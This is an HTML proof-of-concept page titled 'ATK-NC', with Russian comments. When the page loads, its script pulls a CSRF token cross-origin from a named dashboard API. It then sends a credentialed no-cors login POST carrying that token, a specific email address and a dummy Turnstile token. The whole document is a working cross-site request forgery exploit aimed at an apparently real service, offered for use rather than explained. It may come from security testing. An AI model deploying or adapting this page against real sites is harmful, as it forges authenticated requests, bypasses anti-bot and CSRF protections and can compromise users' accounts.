<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>ATK-NC</title></head>
<body><pre id="out">NC-START</pre>
<script>
(async () => {
  try {
    // 1) Получим CSRF (GET — работает cross-origin с CORS headers)
    const csrfResp = await fetch("https://dashboard-api.swapped.com/api/v1/auth/csrf");
    const csrfData = await csrfResp.json();
    const csrf = csrfData.data.csrf_token;
    document.getElementById("out").textContent = "NC-CSRF: " + csrf.slice(0, 15) + "...";

    // 2) POST login с mode:no-cors (запрос уйдёт, ответ opaque)
    const resp = await fetch("https://dashboard-api.swapped.com/api/v1/auth/login", {
      method: "POST",
      mode: "no-cors",
      credentials: "include",
      headers: {
        "Content-Type": "text/plain",
        "X-CSRF-Token": csrf
      },
      body: JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" })
    });
    document.title = "NC-" + resp.type;
    document.getElementById("out").textContent += "\nNC-POST: " + resp.type + " (opaque) — запрос отправлен!";
  } catch (e) {
    document.title = "NC-ERR";
    document.getElementById("out").textContent = "NC-ERR " + e.message;
  }
})();
</script></body></html>
